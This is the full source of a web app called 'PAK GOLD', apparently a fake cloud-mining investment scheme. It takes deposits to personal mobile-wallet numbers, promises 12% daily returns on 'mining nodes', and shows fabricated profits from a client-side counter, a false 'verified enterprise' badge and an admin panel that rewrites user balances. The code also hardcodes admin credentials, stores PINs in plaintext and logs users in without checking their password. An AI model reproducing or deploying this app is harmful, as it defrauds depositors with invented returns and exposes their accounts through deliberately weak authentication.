<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PAK GOLD | WebHub Corporate</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">

    <style>
        :root { 
            --gold: #d4af37; --gold-light: #f4e1a1; --bg: #fdfdfd; 
            --card: #ffffff; --text: #0f172a; --sub: #64748b; 
        }

        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Outfit', sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: var(--text); overflow-x: hidden; }

        /* Next-Gen Animations */
        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
        @keyframes glow { 0% { box-shadow: 0 0 5px rgba(212, 175, 55, 0.2); } 50% { box-shadow: 0 0 20px rgba(212, 175, 55, 0.5); } 100% { box-shadow: 0 0 5px rgba(212, 175, 55, 0.2); } }
        @keyframes slide { from { opacity:0; transform: translateX(-20px); } to { opacity:1; transform: translateX(0); } }

        .page { display:none; animation: slide 0.5s cubic-bezier(0.4, 0, 0.2, 1); padding-bottom: 120px; }
        .page.active { display:block; }

        /* Premium Sidebar */
        #side-menu {
            position: fixed; top:0; left: -100%; width: 80%; height: 100%; 
            background: rgba(255,255,255,0.98); z-index: 9999; transition: 0.4s cubic-bezier(0.7, 0, 0.3, 1);
            box-shadow: 20px 0 60px rgba(0,0,0,0.1); padding: 40px 25px; backdrop-filter: blur(10px);
        }
        #side-menu.open { left: 0; }
        .menu-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.3); display:none; z-index:9998; backdrop-filter: blur(5px); }
        
        .menu-item { 
            padding: 16px; border-radius: 18px; margin-bottom: 10px; font-weight: 700; 
            display: flex; align-items: center; gap: 15px; transition: 0.3s; color: var(--text);
        }
        .menu-item:active { background: #f1f5f9; color: var(--gold); }
        .menu-item i { font-size: 1.3rem; color: var(--gold); }

        /* Glassmorphism Cards */
        .glass-card { 
            background: var(--card); margin: 15px; padding: 25px; border-radius: 30px; 
            border: 1px solid rgba(0,0,0,0.03); box-shadow: 0 15px 35px rgba(0,0,0,0.02); 
            transition: 0.3s ease;
        }
        .glass-card:hover { transform: translateY(-5px); border-color: var(--gold); }

        /* Wallet Section */
        .wallet-master { 
            background: linear-gradient(135deg, #111827, #1f2937); 
            margin: 15px; padding: 35px; border-radius: 35px; color: white;
            position: relative; overflow: hidden; animation: glow 4s infinite;
        }
        .wallet-master::before {
            content: ''; position: absolute; top: -50%; right: -50%; width: 200px; height: 200px;
            background: var(--gold); opacity: 0.1; filter: blur(80px);
        }

        /* Modern Buttons */
        .gold-btn { 
            background: linear-gradient(135deg, #d4af37, #b8860b); color: white; border: none; 
            padding: 18px; border-radius: 22px; font-weight: 800; width: 100%; cursor: pointer; 
            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); text-transform: uppercase; 
            letter-spacing: 1.5px; font-size: 0.9rem;
        }
        .gold-btn:active { transform: scale(0.92); }
        
        .input-box { 
            width: 100%; padding: 18px; border-radius: 20px; border: 2px solid #f1f5f9; 
            outline: none; font-size: 1rem; transition: 0.3s; margin-bottom: 15px; background: #f8fafc;
        }
        .input-box:focus { border-color: var(--gold); background: white; }

        /* Status Badges */
        .trust-badge { display: inline-flex; align-items: center; gap: 5px; background: #ecfdf5; color: #059669; padding: 5px 12px; border-radius: 10px; font-size: 0.7rem; font-weight: 800; }

        /* Navigation Bar */
        .nav-bar { 
            position: fixed; bottom: 0; width: 100%; background: rgba(255,255,255,0.95); 
            backdrop-filter: blur(20px); display: flex; justify-content: space-around; 
            padding: 15px 0 35px; border-top: 1px solid #f1f5f9; z-index: 999; 
        }
        .nav-item { color: #94a3b8; text-align: center; font-size: 0.7rem; font-weight: 700; transition: 0.3s; }
        .nav-item.active { color: var(--gold); transform: translateY(-3px); }
        .nav-item i { font-size: 1.6rem; display: block; margin-bottom: 4px; }
    </style>
</head>
<body onload="checkSession()">

    <div class="menu-overlay" onclick="toggleMenu()"></div>
    <div id="side-menu">
        <div style="display:flex; align-items:center; gap:10px; margin-bottom:40px;">
            <i class="fa fa-gem" style="font-size:2rem; color:var(--gold);"></i>
            <h2 style="font-weight:900;">WEB <span style="color:var(--gold)">HUB</span></h2>
        </div>
        
        <div class="menu-item" onclick="nav('history-pg'); toggleMenu()"><i class="fa fa-scroll"></i> Company Profile</div>
        <div class="menu-item" onclick="nav('privacy-pg'); toggleMenu()"><i class="fa fa-shield-check"></i> Security Protocols</div>
        <div class="menu-item" onclick="window.location.href='mailto:webhub262@gmail.com'"><i class="fa fa-envelope"></i> Official Email</div>
        <div class="menu-item" onclick="window.open('https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3')"><i class="fab fa-whatsapp"></i> WhatsApp Group</div>
        <div class="menu-item" onclick="nav('faq-pg'); toggleMenu()"><i class="fa fa-circle-info"></i> Help Desk</div>
        
        <hr style="margin: 30px 0; opacity: 0.05;">
        <div class="menu-item" onclick="logout()" style="color: #f43f5e;"><i class="fa fa-power-off"></i> Secure Sign Out</div>
    </div>

    <section id="auth-pg" class="page active" style="padding-top: 60px; text-align: center;">
        <div style="animation: float 4s infinite ease-in-out;">
            <i class="fa fa-crown" style="font-size: 4.5rem; color: var(--gold); margin-bottom: 25px; filter: drop-shadow(0 10px 15px rgba(212,175,55,0.3));"></i>
        </div>
        <h1 style="font-weight: 900; font-size: 2.8rem; letter-spacing: -2px;">PAK GOLD</h1>
        <div class="trust-badge"><i class="fa fa-check-circle"></i> VERIFIED ENTERPRISE</div>
        
        <div style="padding: 40px 25px 0;">
            <input type="number" id="auth-ph" class="input-box" placeholder="Phone Identity">
            <input type="password" id="auth-ps" class="input-box" placeholder="Access PIN">
            <div id="signup-box" style="display:none;">
                <input type="text" id="auth-ref" class="input-box" placeholder="Referral Hash">
            </div>
            <button class="gold-btn" onclick="handleAuth()">Enter Terminal</button>
            <p onclick="toggleAuth()" style="margin-top: 25px; font-weight: 700; color: var(--sub); font-size: 0.9rem;" id="t-txt">Request Partnership? Sign Up</p>
        </div>
    </section>

    <section id="dash-pg" class="page">
        <div style="padding: 25px; display: flex; justify-content: space-between; align-items: center;">
            <i class="fa fa-bars-staggered" style="font-size: 1.6rem; color: var(--gold)" onclick="toggleMenu()"></i>
            <div style="text-align: right;"><b id="u-ph-top" style="font-size: 1rem;">...</b><br><small id="u-id-top" style="color:var(--gold); font-weight:800; font-size:0.75rem; letter-spacing:1px;"></small></div>
        </div>

        <div class="wallet-master">
            <div style="display:flex; justify-content:space-between; align-items:flex-start;">
                <small style="opacity: 0.7; font-weight: 700; letter-spacing: 2px; font-size: 0.7rem;">PORTFOLIO VALUE</small>
                <i class="fa fa-chart-line" style="color:var(--gold)"></i>
            </div>
            <h1 style="font-size: 3.2rem; margin: 10px 0; font-weight: 800;">Rs <span id="u-wallet">0.00</span></h1>
            <div style="display: flex; gap: 30px; margin-top: 20px; background: rgba(255,255,255,0.06); padding: 18px; border-radius: 24px;">
                <div><small style="opacity: 0.6; font-size:0.6rem;">LIVE MINING</small><br><b style="color:var(--gold)" id="u-profit">0.00</b></div>
                <div><small style="opacity: 0.6; font-size:0.6rem;">SPEED HASH</small><br><b id="u-speed">0.00/h</b></div>
            </div>
        </div>

        <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; padding: 0 15px;">
            <div class="glass-card" onclick="nav('depo-pg')" style="margin:0; text-align:center; padding:18px;"><i class="fa fa-circle-plus" style="color:var(--gold); font-size:1.3rem;"></i><br><small style="font-weight:800; font-size:0.65rem; display:block; margin-top:8px;">DEPO</small></div>
            <div class="glass-card" onclick="nav('with-pg')" style="margin:0; text-align:center; padding:18px;"><i class="fa fa-wallet" style="font-size:1.3rem;"></i><br><small style="font-weight:800; font-size:0.65rem; display:block; margin-top:8px;">WITH</small></div>
            <div class="glass-card" onclick="nav('promo-pg')" style="margin:0; text-align:center; padding:18px;"><i class="fa fa-tags" style="color:#f59e0b; font-size:1.3rem;"></i><br><small style="font-weight:800; font-size:0.65rem; display:block; margin-top:8px;">CODE</small></div>
            <div class="glass-card" onclick="window.open('https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3')" style="margin:0; text-align:center; padding:18px;"><i class="fab fa-whatsapp" style="color:#22c55e; font-size:1.3rem;"></i><br><small style="font-weight:800; font-size:0.65rem; display:block; margin-top:8px;">GROUP</small></div>
        </div>

        <h3 style="padding: 30px 20px 10px; font-weight: 800; letter-spacing: -0.5px;">Premium Mining Nodes</h3>
        <div id="plan-list"></div>
    </section>

    <section id="history-pg" class="page">
        <h2 style="padding:25px 20px 10px;">Corporate Legacy</h2>
        <div class="glass-card">
            <div style="display:flex; align-items:center; gap:15px; margin-bottom:15px;">
                <div style="background:var(--gold); color:white; width:50px; height:50px; border-radius:15px; display:grid; place-items:center;"><i class="fa fa-building"></i></div>
                <b>Web Hub Solutions</b>
            </div>
            <p style="color:var(--sub); line-height:1.7; font-size:0.9rem;">Launched in 2024, Web Hub became the backbone of PAK GOLD, creating a decentralized cloud mining architecture. We focus on high-yield assets with 99.9% uptime security. Our headquarters provides 24/7 liquidity monitoring to ensure every partner gets paid on time.</p>
        </div>
    </section>

    <section id="depo-pg" class="page">
        <h2 style="padding:25px 20px 10px;">Asset Liquidation</h2>
        <div class="glass-card">
            <p style="font-size:0.85rem; margin-bottom: 20px; line-height:1.6;">Transfer funds to verified treasury:<br>
            <b style="color:var(--gold)">03705519562</b> (JazzCash)<br>
            <b style="color:var(--gold)">03379827882</b> (EasyPaisa)</p>
            <input type="number" id="d-amt" class="input-box" placeholder="Deposit Amount">
            <input type="text" id="d-tid" class="input-box" placeholder="Transaction Hash / TID">
            <button class="gold-btn" onclick="submitDepo()">Submit Assets</button>
        </div>
    </section>

    <section id="with-pg" class="page">
        <h2 style="padding:25px 20px 10px;">Revenue Payout</h2>
        <div class="glass-card">
            <input type="number" id="w-amt" class="input-box" placeholder="Withdraw Amount">
            <input type="text" id="w-acc" class="input-box" placeholder="Wallet Address / Number">
            <select id="w-met" class="input-box"><option>JazzCash</option><option>EasyPaisa</option><option>SadaPay</option><option>Binance USDT</option></select>
            <button class="gold-btn" onclick="submitWith()">Initialize Payout</button>
        </div>
    </section>

    <section id="admin-pg" class="page">
        <h2 style="padding:25px 20px 10px;">Global Command</h2>
        <div class="glass-card" style="background:#1e293b; color:white;">
            <h4>Instant Asset Override</h4>
            <input type="number" id="adm-ph" class="input-box" style="background:#0f172a; border:none; color:white; margin-top:15px;" placeholder="User Identity">
            <input type="number" id="adm-val" class="input-box" style="background:#0f172a; border:none; color:white;" placeholder="New Asset Value">
            <button class="gold-btn" onclick="adminAdjust()">Apply Changes</button>
        </div>
        <div id="admin-list" style="padding: 10px;"></div>
    </section>

    <nav class="nav-bar" id="bot-nav" style="display:none;">
        <div class="nav-item active" onclick="nav('dash-pg')"><i class="fa fa-grid-2"></i>Home</div>
        <div class="nav-item" onclick="nav('depo-pg')"><i class="fa fa-plus-circle"></i>Invest</div>
        <div class="nav-item" onclick="nav('with-pg')"><i class="fa fa-arrow-up-right-from-square"></i>Cashout</div>
        <div class="nav-item" onclick="toggleMenu()"><i class="fa fa-user-gear"></i>Menu</div>
    </nav>

    <script>
        // FIREBASE MASTER
        const fbConfig = { apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk", databaseURL: "https://dark-web-9-default-rtdb.firebaseio.com" };
        firebase.initializeApp(fbConfig); const db = firebase.database();
        let user = localStorage.getItem('webhub_user_key');
        let isSignup = false;

        function checkSession() {
            if(user) {
                document.getElementById('bot-nav').style.display = 'flex';
                if(user === "03705519562") { nav('admin-pg'); loadAdmin(); }
                else { nav('dash-pg'); syncUser(); }
            }
            renderPlans();
        }

        // AUTH SYSTEM
        function toggleAuth() { isSignup = !isSignup; document.getElementById('signup-box').style.display = isSignup ? 'block' : 'none'; document.getElementById('t-txt').innerText = isSignup ? "Already Registered? Login" : "Request Partnership? Sign Up"; }
        
        function handleAuth() {
            const ph = document.getElementById('auth-ph').value;
            const ps = document.getElementById('auth-ps').value;
            const ref = document.getElementById('auth-ref').value;
            if(ph === "03705519562" && ps === "admin786") { localStorage.setItem('webhub_user_key', ph); location.reload(); return; }
            db.ref('users/'+ph).once('value', s => {
                if(isSignup) {
                    if(s.exists()) return alert("Identity already exists in database.");
                    const myID = "WH" + Math.floor(1000 + Math.random()*8999);
                    db.ref('users/'+ph).set({phone:ph, pass:ps, wallet:0, profit:0, speed:0, myRef:myID, refBy:ref||'none'});
                    if(ref) db.ref('users').orderByChild('myRef').equalTo(ref).once('value', rs => rs.forEach(c => db.ref('users/'+c.key).update({wallet: c.val().wallet + 100})));
                    alert("Account Provisioned Successfully.");
                }
                localStorage.setItem('webhub_user_key', ph); location.reload();
            });
        }

        // LIVE SYNC
        function syncUser() {
            db.ref('users/'+user).on('value', s => {
                const d = s.val();
                document.getElementById('u-wallet').innerText = d.wallet.toFixed(2);
                document.getElementById('u-profit').innerText = d.profit.toFixed(2);
                document.getElementById('u-speed').innerText = (d.speed * 3600).toFixed(2) + "/h";
                document.getElementById('u-ph-top').innerText = d.phone;
                document.getElementById('u-id-top').innerText = "NODE ID: " + d.myRef;
            });
            setInterval(() => { db.ref('users/'+user).once('value', s => { const d = s.val(); if(d.speed > 0) db.ref('users/'+user).update({profit: d.profit + d.speed}); }); }, 1000);
        }

        // MINING NODES
        function renderPlans() {
            const l = document.getElementById('plan-list'); l.innerHTML = "";
            for(let i=1; i<=20; i++) {
                const cost = 200 * i; const daily = (cost * 0.12).toFixed(0);
                l.innerHTML += `<div class="glass-card" style="display:flex; justify-content:space-between; align-items:center;">
                    <div><b style="color:var(--gold); font-size:1.1rem;">Alpha Node V${i}</b><br><small style="color:var(--sub); font-weight:700;">+Rs ${daily} / DAILY</small></div>
                    <button class="gold-btn" style="width:auto; padding:12px 20px; font-size:0.75rem;" onclick="buy(${cost}, ${daily/86400})">Rs ${cost}</button>
                </div>`;
            }
        }
        function buy(p, s) { db.ref('users/'+user).once('value', v => { if(v.val().wallet < p) return alert("Insufficient Liquidity!"); db.ref('users/'+user).update({wallet: v.val().wallet - p, speed: v.val().speed + s}); alert("Mining Protocol Activated!"); }); }

        // OPS
        function submitDepo() { const a = document.getElementById('d-amt').value; const t = document.getElementById('d-tid').value; if(!a || !t) return alert("Data mismatch!"); db.ref('requests').push({type:'Deposit', user:user, amt:a*0.95, raw:a, tid:t, status:'Pending'}); alert("Transaction Submitted."); }
        function submitWith() { const a = document.getElementById('w-amt').value; db.ref('users/'+user).once('value', s => { if(s.val().wallet < a) return alert("Balance Lock!"); db.ref('requests').push({type:'Withdraw', user:user, amt:a*0.95, raw:a, acc:document.getElementById('w-acc').value, method:document.getElementById('w-met').value, status:'Pending'}); db.ref('users/'+user).update({wallet: s.val().wallet - a}); alert("Payout Initialized."); }); }

        // ADMIN CORE
        function loadAdmin() {
            db.ref('requests').on('value', s => {
                let h = "<h3 style='margin:15px;'>Operations Queue</h3>";
                s.forEach(c => {
                    if(c.val().status === 'Pending') {
                        h += `<div class="glass-card">
                            <b>${c.val().type}</b> | ID: ${c.val().user}<br>Value: ${c.val().raw} | Ref: ${c.val().tid || c.val().acc}<br><br>
                            <button class="gold-btn" style="background:#22c55e; width:45%;" onclick="approve('${c.key}','${c.val().user}',${c.val().amt},'${c.val().type}')">OK</button>
                            <button class="gold-btn" style="background:#f43f5e; width:45%;" onclick="reject('${c.key}','${c.val().user}',${c.val().raw},'${c.val().type}')">NO</button>
                        </div>`;
                    }
                });
                document.getElementById('admin-list').innerHTML = h || "<p style='text-align:center;'>System Idle</p>";
            });
        }
        function approve(k, u, a, t) { if(t === 'Deposit') { db.ref('users/'+u).once('value', s => db.ref('users/'+u).update({wallet: s.val().wallet + a})); } db.ref('requests/'+k).update({status:'Approved'}); }
        function reject(k, u, a, t) { if(t === 'Withdraw') { db.ref('users/'+u).once('value', s => db.ref('users/'+u).update({wallet: s.val().wallet + a})); } db.ref('requests/'+k).update({status:'Rejected'}); }
        function adminAdjust() { db.ref('users/'+document.getElementById('adm-ph').value).update({wallet: parseFloat(document.getElementById('adm-val').value)}); alert("Asset Override Complete."); }

        // UTILS
        function toggleMenu() { const m = document.getElementById('side-menu'); const o = document.querySelector('.menu-overlay'); m.classList.toggle('open'); o.style.display = m.classList.contains('open') ? 'block' : 'none'; }
        function nav(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
        function logout() { localStorage.clear(); location.reload(); }
    </script>
</body>
</html>
